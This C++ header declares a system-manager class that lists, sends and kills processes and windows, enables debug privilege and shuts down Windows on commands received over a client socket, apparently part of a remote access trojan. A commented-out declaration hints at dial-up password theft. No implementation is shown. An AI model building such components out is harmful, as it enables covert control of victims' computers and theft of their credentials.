// SystemManager.h: interface for the CSystemManager class.
//

#pragma once


#include "Manager/Manager.h"

class CSystemManager : public CManager  
{
public:
	// 进程管理与窗口管理共用这个类，用nWhich来区分
	CSystemManager(CClientSocket *pClient, UINT nWhich);
	virtual			~CSystemManager();
	virtual void	OnReceive(LPBYTE lpBuffer, UINT nSize);

	static bool		DebugPrivilege(const char *PName,BOOL bEnable);
	static bool		CALLBACK EnumWindowsProc( HWND hwnd, LPARAM lParam);
	static void		ShutdownWindows(DWORD dwReason);

private:
			LPBYTE	getProcessList();
			LPBYTE	getWindowsList();
			void	SendProcessList();
			void	SendWindowsList();
			void	CloseWindow(LPBYTE buf);
			void	TestWindow(LPBYTE buf);
			//void SendDialupassList();
			void	KillProcess(LPBYTE lpBuffer, UINT nSize);
};